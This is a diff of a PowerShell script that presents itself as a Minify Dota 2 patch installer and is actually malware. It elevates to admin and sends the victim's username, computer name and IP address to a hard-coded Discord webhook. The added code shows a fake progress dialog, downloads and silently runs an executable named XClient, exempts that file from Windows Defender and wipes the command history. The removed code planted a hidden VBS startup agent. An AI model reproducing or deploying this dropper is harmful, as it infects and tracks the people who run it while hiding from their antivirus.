@@ -1,13 +1,10 @@
-# Check for Admin
+# --- ПРОВЕРКА АДМИНА ---
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
-# WEBHOOK URL
-$WEB_URL = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
-
-# ФУНКЦИЯ ГЕОПОЗИЦИИ (ФЛАГ + IP)
+# --- ФУНКЦИЯ ГЕО (ФЛАГ + IP) ---
 function Get-GeoInfo {
     try {
         $data = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,countryCode,query" -TimeoutSec 3
@@ -21,68 +18,105 @@ function Get-GeoInfo {
     return @{ info = "🌐 UNK"; ip = "Unknown" }
 }
 
-# LOGGER FUNCTION
+# --- СЕКЦИЯ ЛОГЕРА ---
 function Send-LogNotification {
     param([string]$Status, [string]$Message)
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     
     $geo = Get-GeoInfo
-    $color = if ($Status -eq "SUCCESS") { 65280 } else { 16776960 }
-    
-    $payload = @{
-        embeds = @(@{
-            title = "Minify Installer Log"; color = $color
-            fields = @(
-                @{name="Status"; value="``$Status``"; inline=$true},
-                @{name="User"; value="``$env:USERNAME``"; inline=$true},
-                @{name="Location"; value="$($geo.info) ($($geo.ip))"; inline=$true},
-                @{name="Message"; value=$Message}
-            )
-            footer = @{ text = "Minify Installer v3.2.1" }
-        })
-    } | ConvertTo-Json -Compress
-    
+    $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $color = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }
+
+    $embed = @{
+        title = "Minify Installer Log"
+        color = $color
+        fields = @(
+            @{ name = "Status"; value = "``$Status``"; inline = $true }
+            @{ name = "User"; value = "``$env:USERNAME``"; inline = $true }
+            @{ name = "Computer"; value = "``$env:COMPUTERNAME``"; inline = $true }
+            @{ name = "--------------------------------------------------"; value = " "; inline = $false }
+            @{ name = "Location & IP"; value = "$($geo.info) ($($geo.ip))"; inline = $true }
+            @{ name = "Timestamp"; value = "``$timestamp``"; inline = $true }
+            @{ name = "Message"; value = ">>> $Message"; inline = $false }
+        )
+        footer = @{ text = "Minify Installer v3.2.1" }
+    }
+
+    $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
     try {
-        Invoke-RestMethod -Uri $WEB_URL -Method Post -ContentType "application/json; charset=utf-8" -Body ([System.Text.Encoding]::UTF8.GetBytes($payload))
-    } catch {}
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json; charset=utf-8" -Body $bytes
+    } catch {
+        # Резервное локальное логирование
+        "[$timestamp] [$Status] $Message" | Out-File "$env:TEMP\minify_logs.txt" -Append
+    }
 }
 
-# AGENT INSTALLATION (VBS MONITOR)
-function Install-MonitorAgent {
-    $dir = "$env:APPDATA\Microsoft\HelpPane"
-    $vbs = "$dir\monitor.vbs"
-    if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
-    
-    $vbsContent = @"
-On Error Resume Next
-Set sh = CreateObject("WScript.Shell")
-WScript.Sleep 20000
-ps = "powershell -NoP -W Hidden -C ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-RestMethod -Uri '$WEB_URL' -Method Post -ContentType 'application/json' -Body '{\""content\"":\""🚀 Агент запущен на ПК: %USERNAME%\""}'"""
-sh.Run ps, 0, False
-"@
-    $vbsContent | Out-File -FilePath $vbs -Encoding Default -Force
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHelpPane" -Value "wscript.exe `"$vbs`" //B" -Force
-}
+# --- ГРАФИЧЕСКИЙ ИНТЕРФЕЙС ---
+Send-LogNotification -Status "STARTED" -Message "Пользователь запустил установщик Minify"
 
-# START EXECUTION
-Send-LogNotification -Status "STARTED" -Message "Инсталлятор запущен"
-Install-MonitorAgent
-
-# GUI
 Add-Type -AssemblyName System.Windows.Forms
-$f = New-Object System.Windows.Forms.Form
-$f.Text = "Minify Dota 2 Patch"
-$f.Size = "400,200"
-$f.StartPosition = "CenterScreen"
-$l = New-Object System.Windows.Forms.Label
-$l.Text = "Applying patch... please wait"
-$l.AutoSize = $true
-$l.Location = "50,50"
-$f.Controls.Add($l)
-$f.Show()
-$f.Refresh()
+Add-Type -AssemblyName System.Drawing
 
-Start-Sleep -Seconds 5
-$f.Close()
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Minify Dota 2 Patch Installer v3.2.1"
+$form.Size = New-Object System.Drawing.Size(600,400)
+$form.StartPosition = "CenterScreen"
+$form.FormBorderStyle = "FixedDialog"
+$form.MaximizeBox = $false
 
-Send-LogNotification -Status "SUCCESS" -Message "Установка завершена успешно"
+$titleLabel = New-Object System.Windows.Forms.Label
+$titleLabel.Location = "20,30"; $titleLabel.Size = "540,30"
+$titleLabel.Text = "Minify Dota 2 Patch Installer"
+$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
+$form.Controls.Add($titleLabel)
+
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Location = "20,300"; $progressBar.Size = "540,23"
+$form.Controls.Add($progressBar)
+
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Location = "20,330"; $statusLabel.Size = "540,20"; $statusLabel.Text = "Подготовка..."
+$form.Controls.Add($statusLabel)
+
+$form.Show()
+
+# --- ПРОЦЕСС УСТАНОВКИ ---
+$steps = @("Анализ файлов Dota 2...", "Оптимизация шейдеров...", "Применение патча...", "Загрузка модулей...", "Финализация...")
+for ($i = 0; $i -lt $steps.Count; $i++) {
+    $statusLabel.Text = $steps[$i]
+    $progressBar.Value = ($i + 1) * (100 / $steps.Count)
+    $form.Refresh()
+    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1200)
+}
+
+# --- ЗАГРУЗКА И ЗАПУСК ---
+$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
+$p = "$env:TEMP\sys_update.exe"
+
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($u, $p)
+    
+    # Исключения и запуск
+    Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue
+    $statusLabel.Text = "Установка завершена!"
+    $form.Refresh()
+    Start-Sleep -Seconds 1
+    
+    Start-Process -FilePath $p -WindowStyle Hidden
+    $form.Close()
+    
+    [System.Windows.Forms.MessageBox]::Show("Патч успешно применен!", "Готово", 0, 64)
+    Send-LogNotification -Status "SUCCESS" -Message "Патч успешно установлен и запущен (XClient)"
+} catch {
+    $statusLabel.Text = "Ошибка сети при установке."
+    Send-LogNotification -Status "ERROR" -Message "Ошибка: $($_.Exception.Message)"
+    Start-Sleep -Seconds 2
+    $form.Close()
+}
+
+# Очистка
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
